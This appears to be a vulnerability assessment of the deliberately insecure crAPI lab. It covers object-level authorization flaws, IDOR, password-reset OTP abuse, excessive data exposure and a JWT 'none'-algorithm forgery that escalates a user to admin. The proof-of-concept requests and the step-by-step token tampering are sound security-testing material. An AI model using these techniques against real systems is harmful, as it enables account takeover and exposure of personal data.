# Vulnerability Assessment of crAPI

This assessment evaluated the security posture of crAPI (Completely Ridiculous API) focusing on object-level authorization, authentication flows, and data exposure. Tests were conducted in a controlled manner to confirm vulnerabilities without harming the environment.

## Findings

### Finding 1: Broken Object-Level Authorization

Severity: Critical
Affected URL / Parameter: GET /api/vehicles/refresh?vehicle_id=<vehicle_id>
PoC (safe, redacted):

```
GET https://<host>/api/vehicles/refresh?vehicle_id=23
Authorization: Bearer <YOUR_TOKEN>

Response (redacted):
{
  "vehicle_id": 23,
  "owner": { "user_id": 42, "name":"REDACTED" },
  "last_known_location": { "lat": -1.23456, "lng": 36.12345 }
}
```

![Intercepted request showing unauthorized vehicle data exposure (BOLA)](<attachments/crAPI/Intercepted request showing unauthorized vehicle data exposure (BOLA).png>)

![Broken Object Level Authorization (BOLA)](<attachments/crAPI/Broken Object Level Authorization (BOLA).png>)

**Impact:** Exposure of live location and PII; physical safety and privacy risk.

**Remediation:** Enforce server-side ownership checks, use indirect object references (UUIDs), minimize fields returned, log and alert on unauthorized access.

### Finding 2: IDOR: Mechanic Report Access via report_id

Severity: High
Affected URL / Parameter: GET /api/reports?report_id=<report_id>

PoC (safe, redacted):

```
GET https://<host>/api/reports?report_id=11
Authorization: Bearer <YOUR_TOKEN>

Modify report_id=11 -> report_id=3

Response (redacted):
{
  "report_id": 3,
  "vehicle": { "vehicle_id": 9 },
  "mechanic_notes": "REDACTED",
  "customer": { "name":"REDACTED" }
}
```

![Unauthorized access to mechanic report using modified report_id (IDOR)](<attachments/crAPI/Unauthorized access to mechanic report using modified report_id (IDOR).png>)

**Impact:** Unauthorized access to service reports and PII.

**Remediation:** Validate ownership server-side, use non-predictable identifiers, implement ACLs.

### Finding 3: Broken Authentication / Password Reset Abuse (OTP disclosure)

Severity: Critical
Affected URL / Parameter: POST /api/auth/forgot-password ; MailHog at 127.0.0.1:8025 (test env)

PoC (safe, redacted):

```
POST https://<host>/api/auth/forgot-password
{ "email": "victim@example.com" }
```

Check MailHog UI at http://127.0.0.1:8025 for OTP (test env). Use OTP to reset password via POST /api/auth/reset-password

![OTP retrieval from MailHog demonstrating password reset abuse (Broken Authentication)](<attachments/crAPI/OTP retrieval from MailHog demonstrating password reset abuse (Broken Authentication).png>)

![Plaintext Credentials Exposure](<attachments/crAPI/Plaintext Credentials Exposure.png>)

**Impact:** Full account takeover risk in environments where OTPs are exposed; severe privacy and integrity risk.

**Remediation:** Secure reset tokens, restrict access to mail capture tools, rate-limit resets, enforce strong token expiry and logging.

### Finding 4: Excessive Data Exposure — Orders Endpoint (id=9)

Severity: High
Affected URL / Parameter: GET /api/orders?id=<order_id>

PoC (safe, redacted):

```
GET https://<host>/api/orders?id=9
Authorization: Bearer <YOUR_TOKEN>

Response (redacted):
{
  "order_id":9,
  "customer":{ "user_id":55, "name":"REDACTED", "email":"REDACTED" },
  "items":[{"sku":"ABC123","name":"Item A","price":1200}],
  "payment": { "method":"card", "last4":"REDACTED" }
}
```

![API response revealing another user’s order data (Excessive Data Exposure)](<attachments/crAPI/API response revealing another user’s order data (Excessive Data Exposure).png>)

![Sensitive Information Disclosure ](<attachments/crAPI/Sensitive Information Disclosure .png>)

![Sensitive Service Order Data Exposure](<attachments/crAPI/Sensitive Service Order Data Exposure.png>)

**Impact:** PII and payment leakage; regulatory and fraud risk.

**Remediation:** Field-level filtering, ownership checks, mask sensitive fields, and audit access.

### Finding 5: JWT vulnerability

Endpoint: POST /identity/api/auth/verify
Parameter: JWT token
Risk Rating: Critical

The application accepts JWT tokens with the ‘none’ algorithm, allowing an attacker to forge valid authentication tokens.Additionally, the application fails to validate token integrity thus enabling privilege escalation by modifying the ‘role’ from ‘user’ to ‘admin.

#### Step 1: Capturing the JWT token from authenticate request

![Capturing the JWT token from authenticate request](<attachments/crAPI/Capturing the JWT token from authenticate request.png>)

#### Step 2: Decoding token using jwt.io

![Decoding token](<attachments/crAPI/Decoding token.png>)

#### Step 3: Modifying the JWT header

Changing “alg”: “RS256” to “alg”: “none”
Adding “typ”: “JWT”

#### Step 4: Modifying the JWT payload

Changing “role”: “user” to “role”: “admin”

![Modifying the JWT payload](<attachments/crAPI/Modifying the JWT payload.png>)

#### Step 5: Sending the modified token to POST /identity/api/auth/verify

![Sending the modified token to POST](<attachments/crAPI/Sending the modified token to POST.png>)

#### Step 6: Observing successful authentication with elevated privileges

**Impact:** This vulnerability allows any authenticated user to escalate privileges to administrator level, bypass authentication controls and access sensitive administrative functions.

**Remediation:**

1. Reject ‘none’ algorithm explicitly
2. Update verification endpoint
3. Add unit tests
4. Implement token expiration
5. Add request rate limiting
6. Implement token revocation
7. Update dependencies

## Tools Used

- Burp Suite (intercept/proxy)
- Postman (API client)
- MailHog (OTP capture in test environment)
